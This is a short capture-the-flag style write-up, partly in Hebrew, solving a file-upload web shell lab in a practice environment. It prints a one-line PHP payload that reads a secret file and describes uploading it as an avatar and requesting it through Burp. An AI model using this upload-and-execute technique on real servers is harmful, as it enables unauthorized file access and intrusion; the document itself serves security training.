This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
פתרון:
אוקי אז מה עשיתי פה העלתי קובץ sd.php השם לא משנה רק הphp ואז עשתי  insert על תמונת פורפיל ואז ראיתי `/files/avatars/sd.php` הלכתי לשם וראיתי את הsecret  הייתי צריך עזרה  אז התעזרתי בקלוד ( באיך לראות הsecret בגלל שהנושא חדש לי אמרתי לו  לא להגיד לי את התשובה רק לעזור לי  )  

Lab - File Upload Web Shell
שלבים:
1. העלה קובץ exploit.php עם תוכן:
``` <?php echo file_get_contents('/home/carlos/secret'); ?>```
1. מצא את הנתיב דרך inspect → src של התמונה
   /files/avatars/exploit.php
2. שלח GET לנתיב הזה ב Repeater
3. התשובה מכילה את הסוד

חשוב: .PHP באותיות גדולות לא מורץ
חייב להיות .php קטן
זה דרך בburp suit 
